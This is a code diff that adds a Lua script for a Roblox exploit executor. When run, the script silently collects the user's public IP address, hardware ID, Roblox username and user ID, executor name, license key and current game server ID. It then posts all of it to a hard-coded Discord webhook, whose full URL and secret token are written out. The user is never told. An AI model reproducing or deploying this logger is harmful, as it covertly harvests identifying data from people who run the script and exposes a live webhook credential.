@@ -1,0 +1,55 @@
+local webhook_url = "https://discord.com/api/webhooks/1300001948782690425/RH-uvoV4XxTgWBpSOZkZA-LyLDvr7_oTdZAHjMt0VJPMgrDmBIYU-6-yAVE1ZHqwAS7h"
+local httpService = game:GetService("HttpService")
+local httpRequest = http_request or request or syn.request
+
+local response = httpRequest({Url = "https://api.ipapi.is/?q=", Method = "GET"})
+local responseBody = response.Body
+local parsedBody = httpService:JSONDecode(responseBody)
+local userIp = parsedBody.ip
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local messageData = {
+    embeds = {
+        {
+            title = "Someone Just Used The Script",
+            type = "rich",
+            color = tonumber("1cff1a", 16),
+            thumbnail = {url = "https://images-ext-1.discordapp.net/external/BvwbCMgOz3kH6a_VC2hmZUipfm9-J2hGXIz6orYWsI0/%3Fsize%3D128/https/cdn.discordapp.com/avatars/1178668706461646953/9e228e7b55813229842f76732ce87d06.webp?format=webp"},
+            fields = {
+                {
+                    name = "Username / UserId",
+                    value = string.format("```%s / %d```", game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId),
+                    inline = false
+                },
+                {name = "Internet Protocol", value = string.format("```%s```", tostring(userIp)), inline = true},
+                {name = "Executor", value = "```" .. identifyexecutor() .. "```", inline = true},
+                {name = "Script", value = "```" .. _G.POIWRDX .. "```", inline = true},
+                {name = "Key", value = "```" .. script_key .. "```", inline = true},
+                {name = "Hardware ID", value = string.format("```%s```", gethwid()), inline = false},
+                {name = "JobId", value = string.format("```%s```", jobId), inline = false},
+                {
+                    name = "Profile Link",
+                    value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", game.Players.LocalPlayer.UserId),
+                    inline = true
+                },
+                {
+                    name = "Game Link",
+                    value = string.format("[Click Here](https://www.roblox.com/games/%d)", placeId),
+                    inline = true
+                }
+            }
+        }
+    }
+}
+
+local jsonMessage = httpService:JSONEncode(messageData)
+local headers = {["Content-Type"] = "application/json"}
+
+local success, err = pcall(function()
+    return httpRequest({Url = webhook_url, Body = jsonMessage, Method = "POST", Headers = headers})
+end)
+
+if not success then
+    warn("Error sending webhook: " .. tostring(err))
+end
